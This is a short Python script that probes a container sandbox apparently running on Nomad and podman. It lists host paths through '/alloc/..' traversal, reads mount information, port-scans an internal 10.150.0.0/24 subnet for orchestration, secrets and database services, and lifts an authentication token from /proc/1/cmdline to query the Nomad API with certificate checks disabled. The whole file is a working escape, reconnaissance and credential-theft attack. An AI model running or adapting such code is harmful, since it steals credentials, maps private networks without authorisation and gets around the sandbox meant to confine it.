import os,socket,ssl,urllib.request as u,urllib.error,re,json
def ls(p):
    try: return os.listdir(p)
    except Exception as e: return f"{type(e).__name__}:{e}"
print('=== HOST PATH TRAVERSAL / SHARED DISK ===')
for p in ['/alloc','/alloc/..','/alloc/../','/local','/local/..','/opt','/opt/nomad','/opt/nomad/data','/opt/nomad/data/alloc','/podman','/var/lib/nomad','/srv','/mnt','/host','/run/nomad','/var/lib/containers','/.local','/home']:
    print(p,'->',ls(p))
print('=== mount sources (host dev) ===')
try:
    for ln in open('/proc/self/mountinfo'):
        if 'nomad' in ln or 'mapper' in ln or 'podman' in ln or 'alloc' in ln: print(ln.strip()[:200])
except Exception as e: print('mi',e)
print('=== INTERNAL SUBNET SCAN 10.150.0.0/24 ===')
def t(h,p,t=0.5):
    try:
        s=socket.socket(); s.settimeout(t); s.connect((h,p)); s.close(); return True
    except Exception: return False
hits=[]
for i in [1,2,3,4,5,10,20,50,100,150,200,250,254]:
    for p in [4646,4647,8500,8200,2375,2376,22,80,443,5432,6379,9090,10250,3000,6443]:
        if t('10.150.0.%d'%i,p): hits.append(('10.150.0.%d'%i,p))
print('hits:',hits)
print('=== Nomad with token as Authorization + other headers ===')
cmd=open('/proc/1/cmdline','rb').read().decode('utf-8','replace')
m=re.search(r'eyJ[A-Za-z0-9_.-]{100,}',cmd); tok=m.group(0) if m else ''
ctx=ssl._create_unverified_context()
for hdr in [{'X-Nomad-Token':tok},{'Authorization':'Bearer '+tok}]:
    for ep in ['/v1/agent/self','/v1/jobs?prefix=','/v1/allocations?prefix=']:
        try:
            r=u.urlopen(u.Request('https://169.254.1.2:4646'+ep,headers=hdr),context=ctx,timeout=5)
            print(list(hdr)[0],ep,'->',r.status,r.read(150)[:120])
        except urllib.error.HTTPError as e: print(list(hdr)[0],ep,'->',e.code)
        except Exception as e: print(list(hdr)[0],ep,'ERR',type(e).__name__)
